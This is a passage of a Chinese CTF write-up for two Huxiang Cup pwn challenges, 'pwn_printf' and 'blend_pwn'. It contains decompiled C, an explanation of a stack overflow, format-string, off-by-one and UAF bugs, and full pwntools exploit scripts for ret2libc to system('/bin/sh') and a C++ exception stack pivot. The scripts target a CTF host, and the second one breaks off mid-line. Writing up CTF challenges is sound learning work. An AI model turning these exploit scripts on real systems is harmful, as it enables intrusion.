class="token punctuation">(</span><span class="token string">"Sorry you are out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>注意到后面会判断<code>v12</code>的值是否小于等于<code>0x20</code>，如果成立则进入<code>sub_4007C6</code>这个函数，看看<code>sub_4007C6</code>函数</p><pre class=" language-c"><code class="language-c">ssize_t __fastcall <span class="token function">sub_4007C6</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp+0h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>savedregs<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>相当于一个后门函数，给了我们一个能够溢出的函数，而且输入直接从<code>rbp</code>开始，read函数能够读入的字节数为v12的值。</p><p>我们看看v12从何而来</p><pre class=" language-c"><code class="language-c">dest <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x4000000</span><span class="token punctuation">,</span> <span class="token number">0x4000000uLL</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>v12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>dest<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">0xE000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>程序在<code>0x4000000</code>处映射了一块内存，dest的值即为<code>0x4000000</code>，然后将<code>0x4000000</code>赋值给v12，循环读入的地址为<code>(char *)dest + 8 * i + 0xE000</code>，也就是<code>0x4000000+i*8+0xE000</code>,看起来没有地方能够修改v12的地方，但注意到</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/8.jpg" alt=""></p><p>v12是第9个参数</p><p>并且经过调试，在sprintf函数传参时，其参数也是我们scanf输入的地址</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/9.jpg" alt=""></p><p>因此可以确定v12是scanf输入的第9个数字，我们输入第九个数字为32，也就是进入后门函数的所能允许的最大数值</p><p>进入栈溢出之后就是常规的ret2libc了，通过puts泄露出libc地址，然后返回到后门函数，调用system(‘/bin/sh’)即可</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn_printf'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn_printf'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23_x64.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'You will find this game very interesting\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'32'</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401213</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401213</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4007c6</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>__libc_start_main_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>__libc_start_main_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x453a0</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x18ce17</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000401213</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x2-pwn2-blend-pwn"><a href="#0x2-pwn2-blend-pwn" class="headerlink" title="0x2.pwn2-blend_pwn"></a>0x2.pwn2-blend_pwn</h2><p>检查保护</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/3.jpg" alt=""></p><p>保护全开，IDA分析</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token function">sub_DC0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_10E3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">sub_EA2</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">dele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Quit successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">show_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">666</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        a1 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"It must be a gift"</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"It must be a gift"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>LABEL_17<span class="token punctuation">:</span>        a1 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Your input seems to be wrong!"</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input seems to be wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Current user:"</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Current user:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_17<span class="token punctuation">;</span>      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>除了增删查改四个功能以外还有一个gift功能</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/4.jpg" alt=""></p><p>可以溢出到rbp，然后如果输入的数值长度超过0x10就会有一个C++的异常处理机制，抛出一个错误</p><p>再看到别的功能</p><h5 id="1-show-name"><a href="#1-show-name" class="headerlink" title="1.show_name"></a>1.show_name</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span>byte_202080<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>存在格式化字符串漏洞</p><p><code>0x202080</code>处的值来源于程序开头的一个函数</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_10E3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter a name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read_str</span><span class="token punctuation">(</span>byte_202080<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>read_str</code>存在off-by-one，可以多输入一个字符</p><h5 id="2-new-note"><a href="#2-new-note" class="headerlink" title="2.new_note"></a>2.new_note</h5><pre class=" language-c"><code class="language-c">__int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_2020A0 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> dword_2020A0 <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Insufficient space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v0 <span class="token operator">=</span> dword_2020A0<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> dword_2020A0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"down!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">++</span>dword_2020A0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>只能申请两次，然后分配一个0x60的chunk</p><h5 id="3-del-note"><a href="#3-del-note" class="headerlink" title="3.del_note"></a>3.del_note</h5><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">dele</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">sub_EA2</span><span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Insufficient space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"down!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>存在uaf，但实际上无法利用，因为总共只能分配两个chunk，只能用来泄露堆地址</p><h5 id="4-show-note"><a href="#4-show-note" class="headerlink" title="4.show_note"></a>4.show_note</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token punctuation">)</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index %d:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202090 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>打印所有chunk的内容</p><p>综合下来，程序总共有两个漏洞，gift功能中的一个栈溢出(可以溢出到rbp)，还有del功能中的一个uaf</p><p>我在ctf-all-in-one这本书里看到过一题，利用的就是c++的异常处理机制，所以看到这道题就猜测可能和c++的异常处理机制有关，可惜不知道从何利用，太菜了，还是因为ex师傅和r4bbit师傅提点才明白了怎么做。</p><p>实际上这题可以不用堆的相关操作，因为涉及到C++的异常处理机制，有些复杂，这里长话短说，<del>实际上是因为我也没太懂</del>，在异常被抛出捕获且正确处理后，为了所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收，会触发栈回退（Stack Unwind）机制。栈回退机制会重建函数调用现场，rbp自然属于函数调用的一部分，在gift功能中我们能够溢出到rbp，于是我们可以伪造rbp，当异常处理完毕后就会恢复函数现场，调用<code>leave ret</code>，实现栈迁移，栈就会恢复到我们伪造的rbp处。</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.99'</span><span class="token punctuation">,</span> <span class="token number">52504</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=process('./blend_pwn')</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./blend_pwn'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input note:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your choice >'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input what you want:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please enter a name: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%lx'</span><span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Current user:'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x26c0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%7$lx'</span>gift<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Current user:'</span><span class="token punctuation">)</span>pro_base<span class="token operator">=</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1266</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x26d8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%2$lx'</span>gift<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Current user:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c6780</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span 